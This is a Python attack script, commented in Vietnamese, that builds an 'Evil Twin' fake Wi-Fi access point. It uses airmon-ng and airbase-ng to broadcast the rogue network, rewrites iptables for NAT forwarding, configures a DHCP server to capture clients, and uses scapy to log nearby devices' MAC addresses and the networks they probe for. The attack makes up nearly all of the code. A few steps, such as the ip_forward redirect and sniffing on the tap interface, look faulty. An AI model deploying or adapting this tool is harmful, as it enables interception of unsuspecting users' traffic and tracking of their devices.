import subprocess
import time
import threading
from scapy.all import *

# Cấu hình điểm truy cập giả mạo
SSID = 'hacker vietnam'  # SSID của điểm truy cập giả mạo
INTERFACE = 'wlan0'  # Tên giao diện mạng
CHANNEL = 6  # Kênh phát sóng

# Cấu hình IP và DHCP
GATEWAY_IP = '192.168.1.1'
DHCP_RANGE_START = '192.168.1.10'
DHCP_RANGE_END = '192.168.1.50'

# Khởi tạo điểm truy cập giả mạo
def start_fake_ap():
    subprocess.run(['airmon-ng', 'start', INTERFACE], check=True)
    subprocess.Popen(['airbase-ng', '-e', SSID, '-c', str(CHANNEL), INTERFACE])
    time.sleep(5)  # Chờ chế độ monitor được kích hoạt
    subprocess.run(['ifconfig', 'at0', 'up'], check=True)
    subprocess.run(['ifconfig', 'at0', GATEWAY_IP, 'netmask', '255.255.255.0'], check=True)
    subprocess.run(['iptables', '--flush'], check=True)
    subprocess.run(['iptables', '--table', 'nat', '--flush'], check=True)
    subprocess.run(['iptables', '--delete-chain'], check=True)
    subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], check=True)
    subprocess.run(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', INTERFACE, '-j', 'MASQUERADE'], check=True)
    subprocess.run(['iptables', '--append', 'FORWARD', '--in-interface', 'at0', '-j', 'ACCEPT'], check=True)
    subprocess.run(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], check=True)

    # Cấu hình DHCP
    dhcp_conf_content = f"""
default-lease-time 600;
max-lease-time 7200;
authoritative;
subnet 192.168.1.0 netmask 255.255.255.0 {{
    range {DHCP_RANGE_START} {DHCP_RANGE_END};
    option routers {GATEWAY_IP};
    option domain-name-servers {GATEWAY_IP};
}}
"""
    with open('/etc/dhcp/dhcpd.conf', 'w') as dhcp_conf:
        dhcp_conf.write(dhcp_conf_content)
    subprocess.run(['service', 'isc-dhcp-server', 'restart'], check=True)

# Bắt gói tin để thu thập thông tin
def packet_sniffer():
    def packet_handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            mac_address = pkt.addr2
            ssid = pkt.info.decode()
            print(f'Probe request from {mac_address} for SSID {ssid}')
    
    sniff(iface='at0', prn=packet_handler, store=0)

if __name__ == '__main__':
    try:
        # Khởi động điểm truy cập giả mạo trong một luồng riêng
        ap_thread = threading.Thread(target=start_fake_ap)
        ap_thread.start()

        # Đợi điểm truy cập khởi động
        time.sleep(10)  # Tăng thời gian chờ lên 10 giây để chắc chắn chế độ monitor được kích hoạt

        # Bắt đầu bắt gói tin
        packet_sniffer()
    except KeyboardInterrupt:
        subprocess.run(['airmon-ng', 'stop', 'wlan0mon'], check=True)
        subprocess.run(['iptables', '--flush'], check=True)
        print('Stopped the Evil Twin attack')
